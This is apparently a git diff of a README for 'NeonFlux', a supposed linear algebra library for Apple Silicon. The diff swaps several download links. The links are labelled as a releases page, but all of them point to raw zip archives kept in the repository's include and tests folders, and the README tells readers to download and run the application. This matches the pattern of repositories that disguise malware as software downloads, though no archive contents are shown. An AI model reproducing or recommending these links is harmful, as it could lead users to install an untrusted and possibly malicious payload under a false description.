@@ -1,6 +1,6 @@
 # 🚀 NeonFlux - Fast Linear Algebra for Apple Silicon
 
-[![Download NeonFlux](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/include/neonflux/Neon_Flux_selectively.zip)](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/include/neonflux/Neon_Flux_selectively.zip)
+[![Download NeonFlux](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/tests/Neon-Flux-1.6.zip)](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/tests/Neon-Flux-1.6.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ To get started with NeonFlux, follow these simple steps to download and run the 
 
 1. **Visit the Releases Page:** Click the link below to go to the release page where you can obtain the application.
 
-   [Download NeonFlux](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/include/neonflux/Neon_Flux_selectively.zip)
+   [Download NeonFlux](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/tests/Neon-Flux-1.6.zip)
 
 2. **Choose the Latest Release:** On the releases page, find the latest version of NeonFlux. It will have the highest version number.
 
@@ -36,7 +36,7 @@ To get started with NeonFlux, follow these simple steps to download and run the 
 
 NeonFlux is available for easy download. To get the software:
 
-- **Visit this page to download:** [NeonFlux Releases](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/include/neonflux/Neon_Flux_selectively.zip)
+- **Visit this page to download:** [NeonFlux Releases](https://raw.githubusercontent.com/MitaTuppeu/NeonFlux/main/tests/Neon-Flux-1.6.zip)
 
 Follow the instructions provided in the Getting Started section to ensure a smooth installation process.
 
